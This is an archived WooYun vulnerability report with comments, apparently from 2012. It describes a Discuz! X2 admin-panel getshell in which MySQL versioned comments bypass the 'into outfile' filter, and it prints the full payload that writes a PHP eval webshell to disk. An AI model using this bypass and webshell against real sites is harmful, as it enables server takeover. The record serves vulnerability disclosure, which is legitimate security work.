{"id": 14840, "wybug_id": "wooyun-2012-016134", "wybug_title": "Discuz X2 后台getshell(当mysql为root时）", "wybug_corp": "Discuz!", "wybug_author": "卖切糕的", "wybug_date": "2012-12-17 13:05", "wybug_open_date": "2013-01-31 13:05", "wybug_type": "命令执行", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["过滤不严"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-12-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-12-20：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-02-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-02-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-03-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-01-31：\t细节向公众公开  简要描述： 危险语句过滤，可以绕过 详细说明：  最近帮朋友看了一个站，DZx2的，拿到了创始人都没办法getshell百度无果，自己本地架设了一下1，当mysql是root时站长---数据库---升级尝试select '1' into outfile 'E:\\2.txt'会提示    [Type] 查询语句安全威胁    [Query] select '1' into outfile 'E:\\2.txt'为什么会这样呢？\\config\\config_global.php中限制了into outfile函数尝试绕过/*!select*/ '1' /*!into outfile*/ 'E:\\3.txt'Discuz! 数据结构升级成功，影响的记录行数 1如果要导出一句话，即/*!select*/ '<?php @eval($_POST[cmd]);?>' /*!into outfile*/ 'E:\\3.php'注意:一句话密码不要有引号   漏洞证明：  如上   修复方案：  无   版权声明：转载请注明来源 卖切糕的@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2012-12-17 14:04 厂商回复： 感谢您提出的问题 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-12-17 13:33 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  黄金万两不及切糕一块。    \n     2012-12-17 13:33 |    \t\t木易耳朵 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 搞搞基，日日站，人生乐逍遥。)\t\t \n  web跟打他分离可以么？    \n     2012-12-17 13:34 |    \t\t木易耳朵 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 搞搞基，日日站，人生乐逍遥。)\t\t \n  web跟data分离    \n     2012-12-17 13:35 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  耶稣的马甲，法克。    \n     2012-12-17 13:38 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  这个算sql语句执行时过滤的函数没有过滤完全。    \n     2012-12-17 13:39 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  @木易耳朵 都可以的，需要知道web的路径。找找以前的dz爆的路径就可以。    \n     2012-12-17 14:03 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  x2.5可以么？    \n     2012-12-17 14:38 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  @gainover 都可以的。详细地址：http://www.******.com/0day/Discuz_X****.txt    \n     2012-12-17 14:49 |    \t\t蓝风 \t\t\t( 普通白帽子  |\t\t\t        Rank:125 漏洞数:25        | 崬汸慾哓 嗼檤焄垳皁 沓猵圊屾亾沬荖 颩憬...)\t\t \n  人有黄金万两 我有切糕一刀    \n     2012-12-17 15:14 |    \t\t卖切糕的 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 我是卖切糕的)\t\t \n  @gainover 你的xss扫描器运行今天打不开了，你更新下吧    \n     2012-12-17 16:01 |    \t\t木易耳朵 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 搞搞基，日日站，人生乐逍遥。)\t\t \n  @momo 你发的链接被马赛克了。    \n     2012-12-17 17:04 |    \t\ty35u \t\t\t( 普通白帽子  |\t\t\t        Rank:364 漏洞数:38        | yesu)\t\t \n  楼主好厉害    \n     2012-12-17 19:07 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  http://www.3hack.com/0day/Discuz_X2_%E5%90%8E%E5%8F%B0getshell.txt 是这个不？    \n     2013-01-15 11:57 |    \t\t木易耳朵 \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 搞搞基，日日站，人生乐逍遥。)\t\t \n  @momo 这个明显是把shell导出到mysql服务器了吧。web跟data分离这个应该是不能用。    \n     2013-01-15 14:20 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  这个还是挺通用的 很多cms都可以执行sql    \n     2013-01-31 13:37 |    \t\tboyyzz \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:5        | 大婊砸)\t\t \n  不是原创,网上早有了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}